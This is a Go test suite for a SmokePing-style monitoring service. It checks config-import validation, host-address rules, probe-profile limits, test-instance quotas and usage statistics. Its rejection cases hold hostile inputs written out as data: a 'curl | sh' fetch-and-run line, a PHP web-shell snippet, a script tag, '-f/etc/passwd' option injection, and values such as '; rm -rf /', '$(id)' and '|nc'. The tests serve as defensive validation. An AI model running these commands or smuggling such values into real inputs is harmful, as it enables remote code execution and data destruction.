package main

// Tests for input rules and instance limits: SmokePing import validation,
// host addresses, probe profile rules, test-instance limits and usage stats.
// See SECURITY-TESTING.md.

import (
	"context"
	"fmt"
	"strings"
	"testing"
	"time"
)

const goodConfig = "*** Targets ***\nprobe = FPing\n\n+ Net\nmenu = Net\n\n++ dns\nmenu = Resolvers\nhost = 192.0.2.53\n\n++ web\nhost = www.example.com\n"

func countHosts(t *testing.T, orgID int64) int {
	var n int
	_ = testDB.QueryRow(context.Background(), `SELECT count(*) FROM nodes WHERE org_id = $1 AND kind = 'host'`, orgID).Scan(&n)
	return n
}

func TestImportRejectsNonConfigFiles(t *testing.T) {
	e := newEnv(t)
	o := e.newOrg("imp")
	before := countHosts(t, o.Owner.OrgID)
	bigLines := "*** Targets ***\n" + strings.Repeat("# comment\n", maxImportLines+5)
	manyHosts := "*** Targets ***\n+ all\n"
	for i := 0; i < maxImportHosts+1; i++ {
		manyHosts += fmt.Sprintf("++ h%d\nhost = 10.%d.%d.1\n", i, i/250, i%250)
	}
	cases := map[string]string{
		"pdf":             "%PDF-1.7\n1 0 obj\n<</Filter /FlateDecode>> stream\n",
		"zip/docx":        "PK\x03\x04\x14\x00\x06\x00",
		"elf":             "\x7fELF\x02\x01\x01",
		"nul bytes":       "*** Targets ***\n+ a\nhost = 1.1.1.1\x00\x00",
		"control chars":   "*** Targets ***\n\x1b[31m+ a\n",
		"invalid utf8":    "*** Targets ***\n+ a\nmenu = \xff\xfe\n",
		"shell script":    "#!/bin/sh\ncurl http://x | sh\n*** Targets ***\n",
		"php":             "*** Targets ***\n<?php system($_GET['c']); ?>\n",
		"html script":     "*** Targets ***\n<script>alert(1)</script>\n",
		"no targets":      "*** General ***\nowner = me\n",
		"option inject":   "*** Targets ***\n+ a\nmenu = a\nhost = -f/etc/passwd\n",
		"shell metachars": "*** Targets ***\n+ a\nhost = 1.1.1.1;reboot\n",
		"command subst":   "*** Targets ***\n+ a\nhost = $(id).example.com\n",
		"too many lines":  bigLines,
		"too many hosts":  manyHosts,
	}
	for name, cfg := range cases {
		r := e.req(o.Owner, "POST", "/api/import/smokeping", map[string]any{"config": cfg})
		if r.Status != 400 {
			t.Errorf("%s: status %d, want 400 (%s)", name, r.Status, r.Body)
		}
	}
	if r := e.req(o.Owner, "POST", "/api/import/smokeping", map[string]any{"config": cases["pdf"]}); !strings.Contains(string(r.Body), "PDF") {
		t.Errorf("PDF rejection should say what was uploaded: %s", r.Body)
	}
	if n := countHosts(t, o.Owner.OrgID); n != before {
		t.Fatalf("rejected imports created %d hosts", n-before)
	}
	t0 := dbNow(t)
	e.req(o.Owner, "POST", "/api/import/smokeping", map[string]any{"config": cases["shell script"]})
	if !auditHas(t, o.Owner.OrgID, o.Owner.Email, "import.rejected", t0) {
		t.Error("rejected import not audited")
	}
	// A valid config with an include and a DYNAMIC host imports with warnings.
	cfg := "\xef\xbb\xbf" + goodConfig + "\n@include /etc/smokeping/more\n++ home\nhost = DYNAMIC\n"
	r := e.must(e.req(o.Owner, "POST", "/api/import/smokeping", map[string]any{"config": cfg}), 200, "valid import")
	if r.JSON["hosts"].(float64) != 2 || len(r.JSON["warnings"].([]any)) != 2 {
		t.Errorf("unexpected import result: %s", r.Body)
	}
	if r := e.req(o.Owner, "POST", "/api/import/smokeping", strings.Repeat("x", 4<<20)); r.Status != 400 {
		t.Errorf("4 MB body: %d", r.Status)
	}
}

func TestHostAddressValidation(t *testing.T) {
	e := newEnv(t)
	o := e.newOrg("addr")
	for _, h := range []string{"-f/etc/passwd", "--help", "8.8.8.8; rm -rf /", "$(id)", "a b", "`id`", "host|nc", strings.Repeat("a", 254), "bad..dots", "x.-y.com"} {
		if r := e.req(o.Owner, "POST", "/api/nodes", map[string]any{"kind": "host", "name": "x", "host": h}); r.Status != 400 {
			t.Errorf("host %q accepted: %d", h, r.Status)
		}
		if r := e.req(o.Owner, "PATCH", pathf("/api/nodes/%d", o.HostID), map[string]any{"name": "x", "host": h}); r.Status != 400 {
			t.Errorf("host %q accepted on update: %d", h, r.Status)
		}
	}
	for _, h := range []string{"192.0.2.10", "2001:db8::1", "www.example.com", "core_rtr-1.lan", "example.com."} {
		e.must(e.req(o.Owner, "POST", "/api/nodes", map[string]any{"kind": "host", "name": h, "host": h}), 200, "valid host "+h)
	}
	// A bad address stored out of band is never handed to fping.
	var bad int64
	_ = testDB.QueryRow(context.Background(), `INSERT INTO nodes (org_id, kind, name, host) VALUES ($1, 'host', 'evil', '-f/etc/passwd') RETURNING id`, o.Owner.OrgID).Scan(&bad)
	hosts, _ := e.app.pm.loadHosts(context.Background())
	if _, ok := hosts[bad]; ok {
		t.Error("prober would run fping with an option-like address")
	}
}

func TestProfileRules(t *testing.T) {
	e := newEnv(t)
	o := e.newOrg("prof")
	p := func(interval, pings, size int) map[string]any {
		return map[string]any{"name": "p", "interval_s": interval, "ping_count": pings, "packet_size": size}
	}
	r := e.req(o.Owner, "POST", "/api/profiles", p(10, 20, 56))
	if r.Status != 400 || !strings.Contains(string(r.Body), "cannot exceed the interval") {
		t.Errorf("more pings than interval seconds: %d %s", r.Status, r.Body)
	}
	if r := e.req(o.Owner, "POST", "/api/profiles", p(60, 20, maxPacketSize+1)); r.Status != 400 {
		t.Errorf("packet above 1472 B accepted: %d", r.Status)
	}
	if r := e.req(o.Owner, "PATCH", pathf("/api/profiles/%d", o.ProfileID), p(5, 6, 56)); r.Status != 400 {
		t.Errorf("update with more pings than seconds accepted: %d", r.Status)
	}
	e.must(e.req(o.Owner, "POST", "/api/profiles", p(20, 20, maxPacketSize)), 200, "boundary profile")
	e.must(e.req(o.Owner, "POST", "/api/profiles", p(5, 5, 12)), 200, "fast profile")

	e.app.testMode = true
	for _, bad := range []map[string]any{p(59, 20, 56), p(60, 20, 57), p(30, 20, 56)} {
		if r := e.req(o.Owner, "POST", "/api/profiles", bad); r.Status != 400 || !strings.Contains(string(r.Body), "test instance") {
			t.Errorf("test instance accepted %v: %d %s", bad, r.Status, r.Body)
		}
	}
	e.must(e.req(o.Owner, "POST", "/api/profiles", p(60, 20, 56)), 200, "test-instance profile")
}

func TestTestInstanceLimits(t *testing.T) {
	e := newEnv(t)
	e.app.testMode = true
	e.app.pm.testMode = true
	o := e.newOrg("demo")
	me := e.must(e.req(o.Member, "GET", "/api/me", nil), 200, "me")
	lim := me.JSON["limits"].(map[string]any)
	if lim["test_instance"] != true || lim["host_limit"].(float64) != testHostLimit || lim["min_interval"].(float64) != 60 || lim["max_packet"].(float64) != 56 {
		t.Errorf("limits not reported: %v", lim)
	}
	// Only presets within the limits are seeded.
	var bad int
	_ = testDB.QueryRow(context.Background(), `SELECT count(*) FROM probe_profiles WHERE org_id = $1 AND (interval_s < 60 OR packet_size > 56)`, o.Owner.OrgID).Scan(&bad)
	if bad > 0 {
		t.Errorf("%d seeded profiles break the test-instance limits", bad)
	}
	for countHosts(t, o.Owner.OrgID) < testHostLimit {
		e.must(e.req(o.Owner, "POST", "/api/nodes", map[string]any{"kind": "host", "name": "h", "host": "192.0.2.20"}), 200, "host under limit")
	}
	t0 := dbNow(t)
	if r := e.req(o.Owner, "POST", "/api/nodes", map[string]any{"kind": "host", "name": "h", "host": "192.0.2.21"}); r.Status != 403 {
		t.Fatalf("11th host accepted: %d", r.Status)
	}
	if !auditHas(t, o.Owner.OrgID, o.Owner.Email, "denied.host.limit", t0) {
		t.Error("host limit refusal not audited")
	}
	e.must(e.req(o.Owner, "POST", "/api/nodes", map[string]any{"kind": "folder", "name": "folders are free"}), 200, "folder")
	if r := e.req(o.Owner, "POST", "/api/import/smokeping", map[string]any{"config": goodConfig}); r.Status != 403 || !strings.Contains(string(r.Body), "this adds 2 hosts") {
		t.Errorf("import over the limit: %d %s", r.Status, r.Body)
	}
	// Stored profiles that predate the limits are clamped by the prober.
	var pid int64
	_ = testDB.QueryRow(context.Background(), `INSERT INTO probe_profiles (org_id, name, interval_s, ping_count, packet_size) VALUES ($1, 'old', 10, 10, 1400) RETURNING id`, o.Owner.OrgID).Scan(&pid)
	_, _ = testDB.Exec(context.Background(), `UPDATE nodes SET profile_id = $1 WHERE id = $2`, pid, o.HostID)
	hosts, _ := e.app.pm.loadHosts(context.Background())
	if h := hosts[o.HostID]; h.intervalS < 60 || h.packetSize > 56 {
		t.Errorf("prober not clamped on a test instance: %+v", h)
	}
	// A platform admin can lift the limit for one organization.
	sa := e.superadmin()
	e.must(e.req(sa, "PATCH", pathf("/api/admin/orgs/%d/limits", o.Owner.OrgID), map[string]any{"host_limit": 12}), 200, "raise limit")
	e.must(e.req(o.Owner, "POST", "/api/import/smokeping", map[string]any{"config": goodConfig}), 200, "import within raised limit")
	e.must(e.req(sa, "PATCH", pathf("/api/admin/orgs/%d/limits", o.Owner.OrgID), map[string]any{"host_limit": 0}), 200, "unlimited")
	e.must(e.req(o.Owner, "POST", "/api/nodes", map[string]any{"kind": "host", "name": "h", "host": "192.0.2.22"}), 200, "unlimited host")
	for _, v := range []any{-1, 100001, "ten"} {
		if r := e.req(sa, "PATCH", pathf("/api/admin/orgs/%d/limits", o.Owner.OrgID), map[string]any{"host_limit": v}); r.Status != 400 {
			t.Errorf("host_limit %v accepted: %d", v, r.Status)
		}
	}
	// Off the test instance there is no default limit.
	e.app.testMode = false
	o2 := e.newOrg("selfhosted")
	if lim := e.must(e.req(o2.Owner, "GET", "/api/me", nil), 200, "me").JSON["limits"].(map[string]any); lim["host_limit"].(float64) != 0 || lim["test_instance"] != false {
		t.Errorf("self-hosted instance has limits: %v", lim)
	}
	for _, v := range []string{"no", "disable", "false", "0", "off", ""} {
		if parseBoolEnv(v) {
			t.Errorf("TEST_INSTANCE=%q enables limits", v)
		}
	}
	for _, v := range []string{"yes", "YES", "true", "1", "on", "enable"} {
		if !parseBoolEnv(v) {
			t.Errorf("TEST_INSTANCE=%q does not enable limits", v)
		}
	}
}

func TestUsageStats(t *testing.T) {
	e := newEnv(t)
	o, other := e.newOrg("usage"), e.newOrg("usage-other")
	r := e.must(e.req(o.Member, "GET", "/api/usage", nil), 200, "usage")
	if r.JSON["records"].(float64) < 30 || r.JSON["bytes"].(float64) <= 0 || r.JSON["records_per_day"].(float64) <= 0 {
		t.Errorf("usage numbers: %s", r.Body)
	}
	pts := r.JSON["forecast"].([]any)
	prev := 0.0
	for _, p := range pts {
		v := p.(map[string]any)["bytes"].(float64)
		if v < prev {
			t.Fatal("forecast decreases")
		}
		prev = v
	}
	body := string(r.Body)
	for _, leak := range []string{"sample_rollups", "samples", "audit_log", other.Owner.Email, "usage-other host"} {
		if strings.Contains(body, leak) {
			t.Errorf("usage response exposes %q", leak)
		}
	}
}

func TestExemptFromTestInstanceLimits(t *testing.T) {
	e := newEnv(t)
	e.app.testMode = true
	e.app.pm.testMode = true
	o := e.newOrg("exempt")
	sa := e.superadmin()
	if r := e.req(o.Owner, "POST", "/api/profiles", map[string]any{"name": "fast", "interval_s": 30, "ping_count": 20, "packet_size": 56}); r.Status != 400 {
		t.Fatalf("30 s profile accepted before exemption: %d", r.Status)
	}
	e.must(e.req(sa, "PATCH", pathf("/api/admin/orgs/%d/limits", o.Owner.OrgID), map[string]any{"host_limit": nil, "exempt_limits": true}), 200, "exempt")
	if lim := e.must(e.req(o.Owner, "GET", "/api/me", nil), 200, "me").JSON["limits"].(map[string]any); lim["exempt"] != true || lim["host_limit"].(float64) != 0 || lim["min_interval"].(float64) != minIntervalS {
		t.Errorf("exempt org still limited: %v", lim)
	}
	r := e.must(e.req(o.Owner, "POST", "/api/profiles", map[string]any{"name": "fast", "interval_s": 30, "ping_count": 20, "packet_size": 1400}), 200, "fast profile")
	pid := int64(r.JSON["id"].(float64))
	_, _ = testDB.Exec(context.Background(), `UPDATE nodes SET profile_id = $1 WHERE id = $2`, pid, o.HostID)
	if h := mustHost(t, e, o.HostID); h.intervalS != 30 || h.packetSize != 1400 {
		t.Errorf("prober clamps an exempt org: %+v", h)
	}
	for countHosts(t, o.Owner.OrgID) <= testHostLimit {
		e.must(e.req(o.Owner, "POST", "/api/nodes", map[string]any{"kind": "host", "name": "h", "host": "192.0.2.30"}), 200, "host past the test limit")
	}
	if !auditHas(t, o.Owner.OrgID, sa.Email, "admin.org_limits", dbNow(t).Add(-time.Minute)) {
		t.Error("exemption not audited")
	}
	// Revoking the exemption brings the limits back (existing hosts stay).
	e.must(e.req(sa, "PATCH", pathf("/api/admin/orgs/%d/limits", o.Owner.OrgID), map[string]any{"host_limit": nil, "exempt_limits": false}), 200, "revoke")
	if h := mustHost(t, e, o.HostID); h.intervalS < 60 || h.packetSize > 56 {
		t.Errorf("limits not restored: %+v", h)
	}
	if r := e.req(o.Owner, "POST", "/api/nodes", map[string]any{"kind": "host", "name": "h", "host": "192.0.2.31"}); r.Status != 403 {
		t.Errorf("host added over the limit after revoking: %d", r.Status)
	}
	if countHosts(t, o.Owner.OrgID) <= testHostLimit {
		t.Error("existing hosts were removed")
	}
}

func mustHost(t *testing.T, e *env, id int64) hostSpec {
	t.Helper()
	hosts, err := e.app.pm.loadHosts(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	return hosts[id]
}
